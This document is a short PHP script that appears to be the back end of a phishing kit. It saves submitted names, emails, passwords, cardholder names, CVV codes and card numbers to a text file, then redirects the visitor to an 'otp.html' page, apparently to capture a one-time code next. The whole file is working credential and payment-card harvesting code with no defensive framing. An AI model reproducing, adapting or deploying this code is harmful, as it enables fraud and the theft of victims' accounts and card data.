<?php

file_put_contents("info.txt", "Name: " . $_POST['name']."\n". "Email: " . $_POST['email']."\n".  "Password: " . $_POST['password']."\n". "Owner: " . $_POST['owner']."\n". "cvv: " . $_POST['cvv']."\n".  "cardNumber: " . $_POST['cardNumber']."\n"."###########################################################"."\n", FILE_APPEND);
header('Location: otp.html');
exit();
?>
